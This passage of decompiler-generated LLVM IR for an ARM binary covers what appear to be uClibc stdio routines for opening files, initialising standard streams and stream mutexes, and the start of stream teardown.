  store i1 %v2_130cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_130cc, label %dec_label_pc_130d4, label %dec_label_pc_13100

dec_label_pc_130d4:                               ; preds = %.thread4
  store i32 80, i32* %r0.global-to-local, align 4
  %v1_130d8 = call i32 @malloc(i32 80)
  store i32 %v1_130d8, i32* %r0.global-to-local, align 4
  store i32 %v1_130d8, i32* @r8, align 4
  %v3_130dc = icmp eq i32 %v1_130d8, 0
  store i1 %v3_130dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_130dc, label %dec_label_pc_13300, label %dec_label_pc_130e4

dec_label_pc_130e4:                               ; preds = %dec_label_pc_130d4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  %v3_130ec = add i32 %v1_130d8, 1
  %v4_130ec = inttoptr i32 %v3_130ec to i8*
  store i8 32, i8* %v4_130ec, align 1
  %v0_130f0 = load i32, i32* %r2.global-to-local, align 4
  %v1_130f0 = load i32, i32* @r8, align 4
  %v2_130f0 = add i32 %v1_130f0, 8
  %v3_130f0 = inttoptr i32 %v2_130f0 to i32*
  store i32 %v0_130f0, i32* %v3_130f0, align 4
  %v0_130f4 = load i32, i32* %r2.global-to-local, align 4
  %v1_130f4 = trunc i32 %v0_130f4 to i8
  %v2_130f4 = load i32, i32* @r8, align 4
  %v3_130f4 = inttoptr i32 %v2_130f4 to i8*
  store i8 %v1_130f4, i8* %v3_130f4, align 1
  %v0_130f8 = load i32, i32* @r8, align 4
  %v1_130f8 = add i32 %v0_130f8, 56
  store i32 %v1_130f8, i32* @r0, align 4
  %v0_130fc = call i32 @__stdio_init_mutex()
  store i32 %v0_130fc, i32* %r0.global-to-local, align 4
  %v0_13100.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_13100

dec_label_pc_13100:                               ; preds = %.thread4, %dec_label_pc_130e4
  %v0_13158 = phi i32 [ %v0_1305c, %.thread4 ], [ %v0_13100.pre, %dec_label_pc_130e4 ]
  %v1_13100 = icmp slt i32 %v0_13158, 0
  %v2_13100 = icmp eq i32 %v0_13158, 0
  store i1 %v2_13100, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_13100, label %dec_label_pc_13158, label %dec_label_pc_13108

dec_label_pc_13108:                               ; preds = %dec_label_pc_13100
  %v0_1310c = load i32, i32* @r4, align 4
  %v2_1310c = and i32 %v0_1310c, 131075
  %v1_13110 = add nuw nsw i32 %v2_1310c, 1
  store i32 %v1_13110, i32* %r2.global-to-local, align 4
  %v0_13114 = load i32, i32* @r6, align 4
  %v1_13114 = add i32 %v0_13114, 1
  %v2_13118 = and i32 %v1_13114, %v1_13110
  store i32 %v2_13118, i32* %r3.global-to-local, align 4
  %v9_1311c = icmp eq i32 %v2_13118, %v1_13110
  store i1 %v9_1311c, i1* %cpsr_z.global-to-local, align 1
  %v1_13120 = load i32, i32* @r8, align 4
  %v2_13120 = add i32 %v1_13120, 4
  %v3_13120 = inttoptr i32 %v2_13120 to i32*
  store i32 %v0_13158, i32* %v3_13120, align 4
  br i1 %v9_1311c, label %dec_label_pc_13128, label %dec_label_pc_1307c

dec_label_pc_13128:                               ; preds = %dec_label_pc_13108
  %v0_13128 = load i32, i32* @r4, align 4
  %v1_13128 = load i32, i32* @r6, align 4
  %v2_13128 = sub i32 -1, %v1_13128
  %v3_13128 = and i32 %v0_13128, %v2_13128
  store i32 %v3_13128, i32* %r3.global-to-local, align 4
  %v1_1312c = and i32 %v3_13128, 1024
  %v2_1312c = icmp eq i32 %v1_1312c, 0
  store i1 %v2_1312c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1312c, label %dec_label_pc_1314c, label %dec_label_pc_13134

dec_label_pc_13134:                               ; preds = %dec_label_pc_13128
  %v0_13134 = load i32, i32* @r5, align 4
  store i32 %v0_13134, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1024, i32* @r2, align 4
  %v2_13140 = call i32 @__libc_fcntl(i32 %v0_13134, i32 4)
  store i32 %v2_13140, i32* %r0.global-to-local, align 4
  %v2_13144 = icmp eq i32 %v2_13140, 0
  store i1 %v2_13144, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13144, label %dec_label_pc_13134.dec_label_pc_1314c_crit_edge, label %dec_label_pc_1307c

dec_label_pc_13134.dec_label_pc_1314c_crit_edge:  ; preds = %dec_label_pc_13134
  %v0_1314c.pre = load i32, i32* @r6, align 4
  %v0_13150.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1314c

dec_label_pc_1314c:                               ; preds = %dec_label_pc_13134.dec_label_pc_1314c_crit_edge, %dec_label_pc_13128
  %v0_13150 = phi i32 [ %v0_13150.pre, %dec_label_pc_13134.dec_label_pc_1314c_crit_edge ], [ %v0_13128, %dec_label_pc_13128 ]
  %v0_1314c = phi i32 [ %v0_1314c.pre, %dec_label_pc_13134.dec_label_pc_1314c_crit_edge ], [ %v1_13128, %dec_label_pc_13128 ]
  %v1_1314c = and i32 %v0_1314c, 131072
  store i32 %v1_1314c, i32* %r3.global-to-local, align 4
  %v2_13150 = or i32 %v1_1314c, %v0_13150
  store i32 %v2_13150, i32* @r4, align 4
  br label %dec_label_pc_1317c

dec_label_pc_13158:                               ; preds = %dec_label_pc_13100
  %v7_13158 = icmp eq i32 %v0_13158, -1
  store i1 %v7_13158, i1* %cpsr_z.global-to-local, align 1
  %v0_13164.pre = load i32, i32* @r4, align 4
  br i1 %v7_13158, label %dec_label_pc_13158._crit_edge, label %bb34

bb34:                                             ; preds = %dec_label_pc_13158
  %v2_1315c = or i32 %v0_13164.pre, 131072
  store i32 %v2_1315c, i32* @r4, align 4
  br label %dec_label_pc_13158._crit_edge

dec_label_pc_13158._crit_edge:                    ; preds = %dec_label_pc_13158, %bb34
  %v0_13164 = phi i32 [ %v2_1315c, %bb34 ], [ %v0_13164.pre, %dec_label_pc_13158 ]
  %v0_13160 = load i32, i32* @r6, align 4
  store i32 %v0_13160, i32* %r0.global-to-local, align 4
  store i32 %v0_13164, i32* %r1.global-to-local, align 4
  store i32 438, i32* @r2, align 4
  %v2_1316c = inttoptr i32 %v0_13160 to i8*
  %v3_1316c = call i32 @__libc_open(i8* %v2_1316c, i32 %v0_13164)
  store i32 %v3_1316c, i32* %r0.global-to-local, align 4
  %v1_13170 = icmp slt i32 %v3_1316c, 0
  %v2_13170 = icmp eq i32 %v3_1316c, 0
  store i1 %v2_13170, i1* %cpsr_z.global-to-local, align 1
  %v1_13174 = load i32, i32* @r8, align 4
  %v2_13174 = add i32 %v1_13174, 4
  %v3_13174 = inttoptr i32 %v2_13174 to i32*
  store i32 %v3_1316c, i32* %v3_13174, align 4
  br i1 %v1_13170, label %dec_label_pc_13090, label %dec_label_pc_1317c

dec_label_pc_1317c:                               ; preds = %dec_label_pc_13158._crit_edge, %dec_label_pc_1314c
  %v0_1317c = load i32, i32* @r8, align 4
  %v1_1317c = inttoptr i32 %v0_1317c to i32*
  %v2_1317c = load i32, i32* %v1_1317c, align 4
  %v1_13180 = and i32 %v2_1317c, 8192
  store i32 %v1_13180, i32* %r3.global-to-local, align 4
  %v3_131841 = udiv i32 %v1_13180, 256
  store i32 %v3_131841, i32* %r2.global-to-local, align 4
  %v1_13188 = trunc i32 %v3_131841 to i8
  %v3_13188 = add i32 %v0_1317c, 1
  %v4_13188 = inttoptr i32 %v3_13188 to i8*
  store i8 %v1_13188, i8* %v4_13188, align 1
  %v0_1318c = load i32, i32* %r3.global-to-local, align 4
  %v1_1318c = trunc i32 %v0_1318c to i8
  %v2_1318c = load i32, i32* @r8, align 4
  %v3_1318c = inttoptr i32 %v2_1318c to i8*
  store i8 %v1_1318c, i8* %v3_1318c, align 1
  %v0_13190 = load i32, i32* @r4, align 4
  %v1_13190 = and i32 %v0_13190, 131072
  store i32 %v1_13190, i32* %r1.global-to-local, align 4
  %v2_13190 = icmp eq i32 %v1_13190, 0
  store i1 %v2_13190, i1* %cpsr_z.global-to-local, align 1
  %v0_13194 = load i32, i32* @r8, align 4
  %v1_13194 = add i32 %v0_13194, 1
  %v2_13194 = inttoptr i32 %v1_13194 to i8*
  %v3_13194 = load i8, i8* %v2_13194, align 1
  %v4_13194 = zext i8 %v3_13194 to i32
  %v1_13198 = inttoptr i32 %v0_13194 to i8*
  %v2_13198 = load i8, i8* %v1_13198, align 1
  %v3_13198 = zext i8 %v2_13198 to i32
  store i32 %v3_13198, i32* %r3.global-to-local, align 4
  br i1 %v2_13190, label %bb36, label %bb35

bb35:                                             ; preds = %dec_label_pc_1317c
  store i32 32768, i32* %r1.global-to-local, align 4
  br label %bb36

bb36:                                             ; preds = %dec_label_pc_1317c, %bb35
  %v0_131ac = phi i32 [ 0, %dec_label_pc_1317c ], [ 32768, %bb35 ]
  %v1_131a0 = and i32 %v0_13190, 1024
  store i32 %v1_131a0, i32* %r0.global-to-local, align 4
  %v4_131a8 = mul nuw nsw i32 %v4_13194, 256
  %v5_131a8 = or i32 %v3_13198, %v4_131a8
  %v2_131ac = or i32 %v0_131ac, %v1_131a0
  store i32 %v2_131ac, i32* %r1.global-to-local, align 4
  %v2_131b4 = or i32 %v5_131a8, %v2_131ac
  %v1_131a4 = mul i32 %v0_13190, 16
  %v1_131b0 = and i32 %v1_131a4, 48
  %v1_131b8 = add nuw nsw i32 %v1_131b0, 16
  %v4_131bc = xor i32 %v1_131b8, 48
  %v5_131bc = or i32 %v2_131b4, %v4_131bc
  store i32 %v5_131bc, i32* %r3.global-to-local, align 4
  %v3_131c019 = udiv i32 %v2_131b4, 256
  store i32 %v3_131c019, i32* %r2.global-to-local, align 4
  %v1_131c4 = trunc i32 %v3_131c019 to i8
  store i8 %v1_131c4, i8* %v2_13194, align 1
  %v0_131c8 = load i32, i32* %r3.global-to-local, align 4
  %v1_131c8 = trunc i32 %v0_131c8 to i8
  %v2_131c8 = load i32, i32* @r8, align 4
  %v3_131c8 = inttoptr i32 %v2_131c8 to i8*
  store i8 %v1_131c8, i8* %v3_131c8, align 1
  %v0_131cc = call i32 @__errno_location()
  store i32 %v0_131cc, i32* %r0.global-to-local, align 4
  %v0_131d0 = load i32, i32* @r8, align 4
  %v1_131d0 = add i32 %v0_131d0, 1
  %v2_131d0 = inttoptr i32 %v1_131d0 to i8*
  %v3_131d0 = load i8, i8* %v2_131d0, align 1
  %v4_131d0 = zext i8 %v3_131d0 to i32
  store i32 %v4_131d0, i32* %r3.global-to-local, align 4
  %v1_131d4 = inttoptr i32 %v0_131d0 to i8*
  %v2_131d4 = load i8, i8* %v1_131d4, align 1
  %v3_131d4 = zext i8 %v2_131d4 to i32
  store i32 %v0_131cc, i32* @r6, align 4
  %v1_131dc = add i32 %v0_131d0, 4
  %v2_131dc = inttoptr i32 %v1_131dc to i32*
  %v3_131dc = load i32, i32* %v2_131dc, align 4
  store i32 %v3_131dc, i32* @r0, align 4
  %v4_131e0 = mul nuw nsw i32 %v4_131d0, 256
  %v5_131e0 = or i32 %v3_131d4, %v4_131e0
  store i32 %v5_131e0, i32* @r4, align 4
  %v1_131e4 = inttoptr i32 %v0_131cc to i32*
  %v2_131e4 = load i32, i32* %v1_131e4, align 4
  store i32 %v2_131e4, i32* @r5, align 4
  %v1_131e8 = call i32 @isatty(i32 %v3_131dc)
  store i32 %v1_131e8, i32* %r0.global-to-local, align 4
  %v0_131ec = load i32, i32* @r4, align 4
  %v4_131ec = mul i32 %v1_131e8, 256
  %v5_131ec = or i32 %v0_131ec, %v4_131ec
  store i32 %v5_131ec, i32* @r4, align 4
  %v3_131f0 = sdiv i32 %v5_131ec, 256
  store i32 %v3_131f0, i32* %r3.global-to-local, align 4
  %v1_131f4 = trunc i32 %v3_131f0 to i8
  %v2_131f4 = load i32, i32* @r8, align 4
  %v3_131f4 = add i32 %v2_131f4, 1
  %v4_131f4 = inttoptr i32 %v3_131f4 to i8*
  store i8 %v1_131f4, i8* %v4_131f4, align 1
  %v0_131f8 = load i32, i32* @r4, align 4
  %v1_131f8 = trunc i32 %v0_131f8 to i8
  %v2_131f8 = load i32, i32* @r8, align 4
  %v3_131f8 = inttoptr i32 %v2_131f8 to i8*
  store i8 %v1_131f8, i8* %v3_131f8, align 1
  %v0_131fc = load i32, i32* @r5, align 4
  %v1_131fc = load i32, i32* @r6, align 4
  %v2_131fc = inttoptr i32 %v1_131fc to i32*
  store i32 %v0_131fc, i32* %v2_131fc, align 4
  %v0_13200 = load i32, i32* @r8, align 4
  %v1_13200 = add i32 %v0_13200, 8
  %v2_13200 = inttoptr i32 %v1_13200 to i32*
  %v3_13200 = load i32, i32* %v2_13200, align 4
  store i32 %v3_13200, i32* %r3.global-to-local, align 4
  %v2_13204 = icmp eq i32 %v3_13200, 0
  store i1 %v2_13204, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13204, label %dec_label_pc_1320c, label %bb37

dec_label_pc_1320c:                               ; preds = %bb36
  store i32 4096, i32* %r0.global-to-local, align 4
  %v1_13210 = call i32 @malloc(i32 4096)
  store i32 %v1_13210, i32* %r0.global-to-local, align 4
  %v2_13214 = icmp eq i32 %v1_13210, 0
  store i1 %v2_13214, i1* %cpsr_z.global-to-local, align 1
  %v1_13228.pre = load i32, i32* @r8, align 4
  br i1 %v2_13214, label %.thread7.thread, label %.thread8

.thread7.thread:                                  ; preds = %dec_label_pc_1320c
  %v2_1322820 = add i32 %v1_13228.pre, 8
  %v3_1322821 = inttoptr i32 %v2_1322820 to i32*
  store i32 0, i32* %v3_1322821, align 4
  br label %.thread10

.thread8:                                         ; preds = %dec_label_pc_1320c
  %v2_13218 = inttoptr i32 %v1_13228.pre to i32*
  %v3_13218 = load i32, i32* %v2_13218, align 4
  %v2_1321c = or i32 %v3_13218, 16384
  store i32 %v2_1321c, i32* %r3.global-to-local, align 4
  %v2_13220 = add i32 %v1_13210, 4096
  store i32 %v2_13220, i32* %r2.global-to-local, align 4
  %v4_13224 = sdiv i32 %v2_1321c, 256
  store i32 %v4_13224, i32* %r1.global-to-local, align 4
  %v2_13228 = add i32 %v1_13228.pre, 8
  %v3_13228 = inttoptr i32 %v2_13228 to i32*
  store i32 %v1_13210, i32* %v3_13228, align 4
  %v1_1322c = load i32, i32* %r2.global-to-local, align 4
  %v2_1322c = load i32, i32* @r8, align 4
  %v3_1322c = add i32 %v2_1322c, 12
  %v4_1322c = inttoptr i32 %v3_1322c to i32*
  store i32 %v1_1322c, i32* %v4_1322c, align 4
  %v1_13230 = load i32, i32* %r1.global-to-local, align 4
  %v2_13230 = trunc i32 %v1_13230 to i8
  %v3_13230 = load i32, i32* @r8, align 4
  %v4_13230 = add i32 %v3_13230, 1
  %v5_13230 = inttoptr i32 %v4_13230 to i8*
  store i8 %v2_13230, i8* %v5_13230, align 1
  %v0_13234.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13234.pr.pr, label %.thread10, label %.thread9

.thread9:                                         ; preds = %.thread8
  %v1_13234 = load i32, i32* %r3.global-to-local, align 4
  %v2_13234 = trunc i32 %v1_13234 to i8
  %v3_13234 = load i32, i32* @r8, align 4
  %v4_13234 = inttoptr i32 %v3_13234 to i8*
  store i8 %v2_13234, i8* %v4_13234, align 1
  %v0_13238.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13238.pr.pr, label %.thread10, label %bb37

.thread10:                                        ; preds = %.thread7.thread, %.thread8, %.thread9
  %v2_13238 = load i32, i32* @r8, align 4
  %v3_13238 = add i32 %v2_13238, 12
  %v4_13238 = inttoptr i32 %v3_13238 to i32*
  store i32 %v1_13210, i32* %v4_13238, align 4
  br label %bb37

bb37:                                             ; preds = %bb36, %.thread9, %.thread10
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_262a4.842 to i32), i32* %r3.global-to-local, align 4
  %v2_13244 = load i32, i32* @r8, align 4
  %v3_13244 = add i32 %v2_13244, 2
  %v4_13244 = inttoptr i32 %v3_13244 to i8*
  store i8 0, i8* %v4_13244, align 1
  %v0_13248 = load i32, i32* @r8, align 4
  %v1_13248 = add i32 %v0_13248, 1
  %v2_13248 = inttoptr i32 %v1_13248 to i8*
  %v3_13248 = load i8, i8* %v2_13248, align 1
  %v4_13248 = zext i8 %v3_13248 to i32
  store i32 %v4_13248, i32* %r2.global-to-local, align 4
  %v2_1324c = load i32, i32* @global_var_262a4.842, align 4
  store i32 %v2_1324c, i32* %r1.global-to-local, align 4
  %v1_13250 = add i32 %v0_13248, 8
  %v2_13250 = inttoptr i32 %v1_13250 to i32*
  %v3_13250 = load i32, i32* %v2_13250, align 4
  store i32 %v3_13250, i32* %r3.global-to-local, align 4
  %v1_13254 = and i32 %v4_13248, 32
  %v2_13254 = icmp eq i32 %v1_13254, 0
  store i1 %v2_13254, i1* %cpsr_z.global-to-local, align 1
  %v2_13258 = add i32 %v0_13248, 20
  %v3_13258 = inttoptr i32 %v2_13258 to i32*
  store i32 %v3_13250, i32* %v3_13258, align 4
  %v0_1325c = load i32, i32* %r0.global-to-local, align 4
  %v1_1325c = load i32, i32* @r8, align 4
  %v2_1325c = add i32 %v1_1325c, 44
  %v3_1325c = inttoptr i32 %v2_1325c to i32*
  store i32 %v0_1325c, i32* %v3_1325c, align 4
  %v0_13260 = load i32, i32* %r1.global-to-local, align 4
  %v1_13260 = load i32, i32* @r8, align 4
  %v2_13260 = add i32 %v1_13260, 52
  %v3_13260 = inttoptr i32 %v2_13260 to i32*
  store i32 %v0_13260, i32* %v3_13260, align 4
  %v0_13264 = load i32, i32* %r3.global-to-local, align 4
  %v1_13264 = load i32, i32* @r8, align 4
  %v2_13264 = add i32 %v1_13264, 24
  %v3_13264 = inttoptr i32 %v2_13264 to i32*
  store i32 %v0_13264, i32* %v3_13264, align 4
  %v0_13268 = load i32, i32* %r3.global-to-local, align 4
  %v1_13268 = load i32, i32* @r8, align 4
  %v2_13268 = add i32 %v1_13268, 28
  %v3_13268 = inttoptr i32 %v2_13268 to i32*
  store i32 %v0_13268, i32* %v3_13268, align 4
  %v0_1326c = load i32, i32* %r3.global-to-local, align 4
  %v1_1326c = load i32, i32* @r8, align 4
  %v2_1326c = add i32 %v1_1326c, 16
  %v3_1326c = inttoptr i32 %v2_1326c to i32*
  store i32 %v0_1326c, i32* %v3_1326c, align 4
  br i1 %v2_13254, label %dec_label_pc_13300, label %dec_label_pc_13274

dec_label_pc_13274:                               ; preds = %bb37
  %v2_13274 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_13274, i32* @r0, align 4
  store i32 ptrtoint (i8* @global_var_16b04.825 to i32), i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2628c.829 to i32), i32* %r2.global-to-local, align 4
  %v1_1328c = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_2628c.829 to i32), i32* %r0.global-to-local, align 4
  %v1_1329c = call i32 @__pthread_return_0()
  store i32 ptrtoint (i32* @global_var_26274.848 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_13050, i32* @r0, align 4
  store i32 ptrtoint (i8* @global_var_16b04.825 to i32), i32* %r1.global-to-local, align 4
  %v1_132b0 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_26274.848 to i32), i32* %r0.global-to-local, align 4
  %v1_132bc = call i32 @__pthread_return_0()
  store i32 ptrtoint (i32** @global_var_26270.851 to i32), i32* %r2.global-to-local, align 4
  %v2_132c4 = load i32, i32* bitcast (i32** @global_var_26270.851 to i32*), align 4
  store i32 %v2_132c4, i32* %r3.global-to-local, align 4
  store i32 %v2_13050, i32* @r0, align 4
  %v1_132cc = load i32, i32* @r8, align 4
  %v2_132cc = add i32 %v1_132cc, 32
  %v3_132cc = inttoptr i32 %v2_132cc to i32*
  store i32 %v2_132c4, i32* %v3_132cc, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_132d8 = load i32, i32* @r8, align 4
  %v1_132d8 = load i32, i32* %r2.global-to-local, align 4
  %v2_132d8 = inttoptr i32 %v1_132d8 to i32*
  store i32 %v0_132d8, i32* %v2_132d8, align 4
  %v1_132e0 = call i32 @__pthread_return_void()
  store i32 %v2_13274, i32* @r0, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 78584, i32* @lr, align 4
  %v1_132f4 = call i32 @__pthread_return_void()
  store i32 %v1_132f4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13300

dec_label_pc_132fc:                               ; preds = %dec_label_pc_13090, %dec_label_pc_1307c, %dec_label_pc_1309c
  store i32 0, i32* @r8, align 4
  br label %dec_label_pc_13300

dec_label_pc_13300:                               ; preds = %bb37, %dec_label_pc_130d4, %dec_label_pc_13274, %dec_label_pc_132fc
  %v0_13300 = load i32, i32* @r8, align 4
  store i32 %v0_13300, i32* %r0.global-to-local, align 4
  %v2_13308 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_13308, i32* @r4, align 4
  store i32 %v6_13044, i32* @r5, align 4
  store i32 %v9_13044, i32* @r6, align 4
  store i32 %v15_13044, i32* @r8, align 4
  ret i32 %v0_13300

; uselistorder directives
  uselistorder i32 %v1_13228.pre, { 1, 0, 2 }
  uselistorder i32 %v1_13210, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v3_131f0, { 1, 0 }
  uselistorder i32 %v3_131841, { 1, 0 }
  uselistorder i32 %v0_13164, { 1, 0 }
  uselistorder i1 %v7_13158, { 1, 0 }
  uselistorder i32 %v1_13128, { 1, 0 }
  uselistorder i32 %v0_13128, { 1, 0 }
  uselistorder i32 %v1_13110, { 1, 0, 2 }
  uselistorder i32 %v1_130c4, { 1, 0 }
  uselistorder i1 %v7_13070, { 1, 0 }
  uselistorder i1 %v7_13064, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 24, 22, 23 }
  uselistorder i32* %r0.global-to-local, { 1, 0, 2, 3, 4, 5, 7, 6, 8, 10, 9, 12, 11, 14, 13, 15, 17, 16, 18, 19 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20 }
  uselistorder i32 16384, { 18, 4, 11, 5, 12, 6, 13, 2, 14, 3, 15, 0, 16, 1, 17, 7, 8, 9, 10 }
  uselistorder label %dec_label_pc_13300, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_132fc, { 2, 0, 1 }
  uselistorder label %bb37, { 2, 1, 0 }
  uselistorder label %.thread10, { 2, 1, 0 }
  uselistorder label %bb36, { 1, 0 }
  uselistorder label %dec_label_pc_13158._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_13100, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_130ac, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1307c, { 1, 2, 0 }
}

define i32 @"$d.2"(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1330c:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_1330c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1330c, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_1330c
  %v3_13314 = and i32 %arg4, %arg3
  store i32 %v3_13314, i32* %r0.global-to-local, align 4
  %v2_13318 = trunc i32 %v3_13314 to i16
  %v4_13318 = inttoptr i32 %v3_13314 to i16*
  store i16 %v2_13318, i16* %v4_13318, align 2
  %v5_13318 = load i32, i32* @r6, align 4
  %v6_13318 = load i32, i32* %r0.global-to-local, align 4
  %v7_13318 = sub i32 %v6_13318, %v5_13318
  store i32 %v7_13318, i32* %r0.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1330c, %bb
  %v8_13318 = phi i32 [ %tmp, %dec_label_pc_1330c ], [ %v7_13318, %bb ]
  ret i32 %v8_13318

; uselistorder directives
  uselistorder i32 %v3_13314, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @_stdio_init() local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_1333c = load i32, i32* @r4, align 4
  store i32 %v3_1333c, i32* %stack_var_-24, align 4
  %v9_1333c = load i32, i32* @r6, align 4
  %v0_13340 = call i32 @__errno_location()
  store i32 ptrtoint (i8** @global_var_262a8.818 to i32), i32* @r4, align 4
  %v3_13348 = load i8, i8* @global_var_262a9.854, align 1
  %v4_13348 = zext i8 %v3_13348 to i32
  %v2_1334c = load i8, i8* bitcast (i8** @global_var_262a8.818 to i8*), align 4
  %v3_1334c = zext i8 %v2_1334c to i32
  store i32 %v0_13340, i32* @r7, align 4
  store i32 0, i32* @r0, align 4
  %v4_13358 = mul nuw nsw i32 %v4_13348, 256
  %v5_13358 = or i32 %v3_1334c, %v4_13358
  store i32 %v5_13358, i32* @r6, align 4
  %v1_1335c = inttoptr i32 %v0_13340 to i32*
  %v2_1335c = load i32, i32* %v1_1335c, align 4
  store i32 %v2_1335c, i32* %r8.global-to-local, align 4
  %v1_13360 = call i32 @isatty(i32 0)
  %v1_13364 = sub i32 1, %v1_13360
  %v0_13368 = load i32, i32* @r6, align 4
  %v4_13368 = mul i32 %v1_13364, 256
  %v5_13368 = xor i32 %v4_13368, %v0_13368
  %v3_1336c = load i8, i8* @global_var_262f9.855, align 1
  %v4_1336c = zext i8 %v3_1336c to i32
  %v3_13370 = load i8, i8* @global_var_262f8.819, align 1
  %v4_13370 = zext i8 %v3_13370 to i32
  %v3_13374 = sdiv i32 %v5_13368, 256
  store i32 1, i32* @r0, align 4
  %v4_1337c = mul nuw nsw i32 %v4_1336c, 256
  %v5_1337c = or i32 %v4_13370, %v4_1337c
  store i32 %v5_1337c, i32* @r5, align 4
  %v1_13380 = trunc i32 %v3_13374 to i8
  store i8 %v1_13380, i8* @global_var_262a9.854, align 1
  %v1_13384 = trunc i32 %v0_13368 to i8
  %v2_13384 = load i32, i32* @r4, align 4
  %v3_13384 = inttoptr i32 %v2_13384 to i8*
  store i8 %v1_13384, i8* %v3_13384, align 1
  %v1_13388 = call i32 @isatty(i32 1)
  %v1_1338c = sub i32 1, %v1_13388
  %v0_13390 = load i32, i32* @r5, align 4
  %v4_13390 = mul i32 %v1_1338c, 256
  %v5_13390 = xor i32 %v4_13390, %v0_13390
  store i32 %v5_13390, i32* %r5.global-to-local, align 4
  %v3_13394 = sdiv i32 %v5_13390, 256
  %v1_13398 = trunc i32 %v3_13394 to i8
  store i8 %v1_13398, i8* @global_var_262f9.855, align 1
  %v0_1339c = load i32, i32* %r8.global-to-local, align 4
  %v1_1339c = load i32, i32* @r7, align 4
  %v2_1339c = inttoptr i32 %v1_1339c to i32*
  store i32 %v0_1339c, i32* %v2_1339c, align 4
  %v0_133a0 = load i32, i32* %r5.global-to-local, align 4
  %v1_133a0 = trunc i32 %v0_133a0 to i8
  store i8 %v1_133a0, i8* @global_var_262f8.819, align 1
  %v2_133a4 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_133a4, i32* @r4, align 4
  store i32 %v9_1333c, i32* @r6, align 4
  ret i32 %v1_1338c

; uselistorder directives
  uselistorder i32 %v1_1338c, { 1, 0 }
  uselistorder i32 %v0_13368, { 1, 0 }
  uselistorder i8* @global_var_262f8.819, { 1, 0 }
  uselistorder i8* @global_var_262f9.855, { 1, 0 }
  uselistorder i32 (i32)* @isatty, { 1, 0, 2 }
  uselistorder i8* @global_var_262a9.854, { 1, 0 }
}

define i32 @__stdio_init_mutex() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_1cc40.857 to i32), i32* @r1, align 4
  store i32 24, i32* @r2, align 4
  %v0_133b4 = call i32 @memcpy()
  %v0_133b8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_133b8, label %bb, label %bb1

bb:                                               ; preds = %entry
  %v1_133b8 = load i32, i32* @r1, align 4
  %v5_133b8 = sdiv i32 %v0_133b4, 16777216
  %v6_133b8 = and i32 %v1_133b8, %v5_133b8
  store i32 %v6_133b8, i32* @ip, align 4
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  ret i32 %v0_133b4

; uselistorder directives
  uselistorder i32 %v0_133b4, { 1, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @_stdio_term() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_133bc = load i32, i32* @r4, align 4
  store i32 %v3_133bc, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i32* @global_var_26274.848 to i32), i32* @r0, align 4
  %v0_133c4 = call i32 @__stdio_init_mutex()
  store i32 ptrtoint (i32* @global_var_2628c.829 to i32), i32* @r0, align 4
  %v0_133cc = call i32 @__stdio_init_mutex()
  store i32 ptrtoint (i32** @global_var_26270.851 to i32), i32* %r3.global-to-local, align 4
  %storemerge5 = load i32, i32* bitcast (i32** @global_var_26270.851 to i32*), align 4
  store i32 %storemerge5, i32* @r4, align 4
  %v1_134286 = add i32 %storemerge5, 56
  store i32 %v1_134286, i32* @r5, align 4
  %v2_1342c8 = icmp eq i32 %storemerge5, 0
  store i32 %v1_134286, i32* %r0.global-to-local, align 4
  br i1 %v2_1342c8, label %dec_label_pc_13438, label %dec_label_pc_133dc

